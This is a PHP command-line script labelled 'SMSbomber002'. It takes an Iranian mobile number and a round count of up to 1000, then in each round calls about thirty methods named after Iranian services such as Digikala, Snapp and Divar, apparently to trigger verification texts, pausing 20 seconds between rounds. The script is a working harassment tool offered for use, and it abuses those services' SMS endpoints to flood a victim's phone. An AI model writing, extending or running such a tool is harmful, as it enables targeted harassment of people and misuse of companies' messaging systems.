<?php
require "SMSbomber002.php";

function startsb002($tnum)
{
    if (preg_match("/^09[0-9]{9}$/", $tnum)) {
        $sb = new smsbomber002($tnum);

        $sb->Szarinpall();
        echo "sent! \n";
        $sb->Sbrozmart();
        echo "sent! \n";
        $sb->Ssabziman();
        echo "sent! \n";
        $sb->Sirantiket();
        echo "sent! \n";
        $sb->Ssinamatiket();
        echo "sent! \n";
        $sb->Sshab();
        echo "sent! \n";
        $sb->S2nabsh();
        echo "sent! \n";
        $sb->Sshabesh();
        echo "sent! \n";
        $sb->Skilid();
        echo "sent! \n";
        $sb->Ssheypoor();
        echo "sent! \n";
        $sb->Sbehtarino();
        echo "sent! \n";
        $sb->Sbanimode();
        echo "sent! \n";
        $sb->Strob();
        echo "sent! \n";
        $sb->Sgap();
        echo "sent! \n";
        $sb->Ssnappdoctor();
        echo "sent! \n";
        $sb->Schamedon();
        echo "sent! \n";
        $sb->Ssnapptrip();
        echo "sent! \n";
        $sb->Spezeshket();
        echo "sent! \n";
        $sb->Ssibche();
        echo "sent! \n";
        $sb->Salibaba();
        echo "sent! \n";
        $sb->Ssnappmarket();
        echo "sent! \n";
        $sb->Sbasalam();
        echo "sent! \n";
        $sb->Ssnapp();
        echo "sent! \n";
        $sb->Sbimecom();
        echo "sent! \n";
        $sb->Sdigikala();
        echo "sent! \n";
        $sb->Sbazzar();
        echo "sent! \n";
        $sb->Sezpay();
        echo "sent! \n";
        $sb->Snamava();
        echo "sent! \n";
        $sb->Sdivar();
        echo "sent! \n";
        $sb->Salopeyk();
        echo "sent! \n";
        $sb->Sbimebazar();
        echo "sent! \n";
        $sb->stapsi();
        echo "sent! \n";
        return "round finished !";
    } else {
        return "The number is Not Valid!";
    }
}
echo "wellcome to SMSbomber002 (modeyfiy  By khaled salhi) \n";
$gnumber = readline("Enter phone number :");
$gc = readline("enter number for while (1-1000) :");
do {
    echo startsb002($gnumber);
    $gc--;
    echo "\n sleep 20 sec :/";
    sleep(20);
} while ($gc > 0);
